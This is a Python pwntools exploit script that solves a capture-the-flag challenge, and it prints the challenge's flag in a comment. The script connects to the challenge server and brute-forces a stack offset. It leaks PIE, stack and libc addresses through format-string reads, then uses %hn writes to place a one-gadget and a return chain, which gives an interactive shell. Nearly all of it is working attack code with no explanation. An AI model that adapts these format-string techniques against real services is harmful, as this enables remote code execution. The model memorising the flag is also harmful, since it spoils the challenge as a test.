#!/usr/bin/env python
from pwn import *

# TWCTF{You_understand_FILE_structure_well!1!1}

l = ELF( './libc-a3c98364f3a1be8fce14f93323f60f3093bdc20ba525b30c32e71d26b59cd9d4.so.6' )

context.arch = 'amd64'

host , port = 'neighbor.chal.ctf.westerns.tokyo' , 37565

t = 1.2

def fmt( p ):
    y.sendline( p )
    sleep( t )

def mod( off , val ):
    fmt( '%{:d}c%7$hhn'.format( off ) )
    fmt( '%{:d}c%11$hn'.format( val ) )



while True:
    y = remote( host , port )
    y.recvuntil( 'mayor.\n' )
    fmt( 'yuawn' )
    guess = 0x20
    p = '%{:d}c%7$hhn'.format( guess )
    fmt( p )
    p = '%{:d}c%11$hhn'.format( 0x90 )
    fmt( p )

    p = '%1c%5$hhn'
    fmt( p )
    
    fmt( 'yuawn' )

    o = y.recvuntil( 'yuawn' , timeout=2.5 )
    print o
    if 'yuawn' in o:
        p = '%10$pABC'
        fmt( p )
        y.recvuntil( '0x' )
        pie = int( y.recvuntil( 'ABC' )[:-3] , 16 ) - 0x962
        success( 'PIE -> %s' % hex( pie ) )
        p = '%7$pABC'
        fmt( p )
        y.recvuntil( '0x' )
        stk = int( y.recvuntil( 'ABC' )[:-3] , 16 )
        success( 'stack -> %s' % hex( stk ) )
        p = '%14$pABC'
        fmt( p )
        y.recvuntil( '0x' )
        l.address = int( y.recvuntil( 'ABC' )[:-3] , 16 ) - 0x203f1
        success( 'libc -> %s' % hex( l.address ) )
        ret = 0x74e
        one = l.address + 0x45526
        xor = l.address + 0x8dbd5

        mod( guess , xor & 0xffff )
        mod( guess + 2 , ( xor & 0xffff0000 ) >> 16 )
        mod( guess + 4 , ( xor & 0xffff00000000 ) >> 32 )

        mod( guess + 8 , one & 0xffff )
        mod( guess + 8 + 2 , ( one & 0xffff0000 ) >> 16 )
        mod( guess + 8 + 4 , ( one & 0xffff00000000 ) >> 32 )

        mod( guess - 8 , ( pie + ret ) & 0xffff )

        y.interactive()
        y.close()

    else:
        y.close()

